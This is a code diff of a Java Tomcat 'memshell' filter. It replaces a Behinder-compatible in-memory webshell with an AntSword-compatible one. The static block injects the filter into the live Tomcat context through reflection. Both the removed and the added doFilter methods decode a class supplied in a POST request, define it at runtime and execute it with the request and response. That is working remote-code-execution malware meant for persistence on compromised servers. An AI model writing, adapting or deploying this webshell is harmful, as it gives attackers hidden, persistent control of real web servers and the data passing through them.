@@ -1,32 +1,29 @@
 package org.erosion2020.memshell;
 
-
-import java.lang.reflect.Field;
-
+import org.apache.catalina.Context;
+import org.apache.catalina.core.ApplicationFilterConfig;
 import org.apache.catalina.core.StandardContext;
-import java.io.IOException;
 import org.apache.catalina.loader.WebappClassLoaderBase;
 import org.apache.tomcat.util.descriptor.web.FilterDef;
 import org.apache.tomcat.util.descriptor.web.FilterMap;
-import java.lang.reflect.Constructor;
-import org.apache.catalina.core.ApplicationFilterConfig;
-import org.apache.catalina.Context;
 
 import javax.servlet.*;
-import java.lang.reflect.Method;
-import java.util.*;
-import javax.crypto.*;
 import javax.servlet.http.HttpServletRequest;
 import javax.servlet.http.HttpServletResponse;
-import javax.servlet.http.HttpSession;
-import javax.crypto.spec.SecretKeySpec;
-import java.util.Base64;
+import java.io.IOException;
+import java.lang.reflect.Constructor;
+import java.lang.reflect.Field;
+import java.lang.reflect.Method;
+import java.util.Map;
+import java.util.concurrent.ConcurrentHashMap;
 
-public class BehinderFilter implements Filter {
+public class AntSwordFilter  implements Filter {
+
+    static Map<String, Class<?>> loaded = new ConcurrentHashMap<>();
+
     public static String name;
     public static String pattern;
     public static String password;
-
     static {
         try {
             final String urlPattern = pattern;
@@ -42,7 +39,7 @@ public class BehinderFilter implements Filter {
                     (Map<String, ApplicationFilterConfig>) filterConfigsField.get(context);
 
             // 创建 Filter 对象和 FilterDef
-            BehinderFilter filter = new BehinderFilter();
+            AntSwordFilter filter = new AntSwordFilter();
             FilterDef filterDef = new FilterDef();
             filterDef.setFilter(filter);
             filterDef.setFilterName(name);
@@ -65,7 +62,6 @@ public class BehinderFilter implements Filter {
 
         } catch (Exception ignore) { }
     }
-
     private static Field findField(Class<?> clazz, String name) throws NoSuchFieldException {
         while (clazz != null) {
             try {
@@ -76,55 +72,54 @@ public class BehinderFilter implements Filter {
         }
         throw new NoSuchFieldException("Field " + name + " not found.");
     }
-
     @Override
-    public void init(FilterConfig filterConfig) { }
+    public void init(FilterConfig filterConfig) throws ServletException {
+        Filter.super.init(filterConfig);
+    }
 
-    @Override
-    public void doFilter(
-            ServletRequest request,
-            ServletResponse response,
-            FilterChain chain
-    ) throws IOException, ServletException {
-        try {
-            HttpServletRequest req = (HttpServletRequest) request;
-            HttpServletResponse resp = (HttpServletResponse) response;
-            HttpSession session = req.getSession();
-
-            if ("POST".equalsIgnoreCase(req.getMethod())) {
-                String key = password;
-                session.setAttribute("u", key); // putValue 已废弃
-
-                Cipher cipher = Cipher.getInstance("AES");
-                cipher.init(Cipher.DECRYPT_MODE, new SecretKeySpec(key.getBytes(), "AES"));
-
-                String line = req.getReader().readLine();
-                byte[] classBytes = cipher.doFinal(Base64.getDecoder().decode(line));
-
-                Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
-                defineClass.setAccessible(true);
-                Class<?> evilClass = (Class<?>) defineClass.invoke(
-                        this.getClass().getClassLoader(),
-                        classBytes, 0, classBytes.length
-                );
-
-                Map<String, Object> pageContext = new HashMap<>();
-                pageContext.put("request", req);
-                pageContext.put("response", resp);
-                pageContext.put("session", session);
-
-                evilClass.getDeclaredConstructor().newInstance().equals(pageContext);
-            }
-
-        } catch (Exception ignore) { }
-
-        chain.doFilter(request, response);
+    class U extends ClassLoader {
+        U(ClassLoader c) {
+            super(c);
+        }
+        public Class g(byte[] b) {
+            return super.defineClass(b, 0, b.length);
+        }
     }
 
     @Override
-    public void destroy() {}
+    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
+        HttpServletRequest request = (HttpServletRequest) servletRequest;
+        HttpServletResponse response = (HttpServletResponse) servletResponse;
+        if ("POST".equalsIgnoreCase(request.getMethod())) {
+            try {
+                String cls = request.getParameter(password);
+                if (cls != null) {
+                    new U(this.getClass().getClassLoader()).g(base64Decode(cls)).newInstance().equals(new Object[]{request,response});
+                }
+            } catch (Exception e) { e.printStackTrace(); }
+        }
+        filterChain.doFilter(request, response);
+    }
 
+    public byte[] base64Decode(String str) throws Exception {
+        Class base64;
+        byte[] value = null;
+        try {
+            base64=Class.forName("sun.misc.BASE64Decoder");
+            Object decoder = base64.newInstance();
+            value = (byte[])decoder.getClass().getMethod("decodeBuffer", new Class[] {String.class }).invoke(decoder, new Object[] { str });
+        } catch (Exception e) {
+            try {
+                base64=Class.forName("java.util.Base64");
+                Object decoder = base64.getMethod("getDecoder", null).invoke(base64, null);
+                value = (byte[])decoder.getClass().getMethod("decode", new Class[] { String.class }).invoke(decoder, new Object[] { str });
+            } catch (Exception ee) {}
+        }
+        return value;
+    }
+
+    @Override
+    public void destroy() {
+        Filter.super.destroy();
+    }
 }
-
-
-
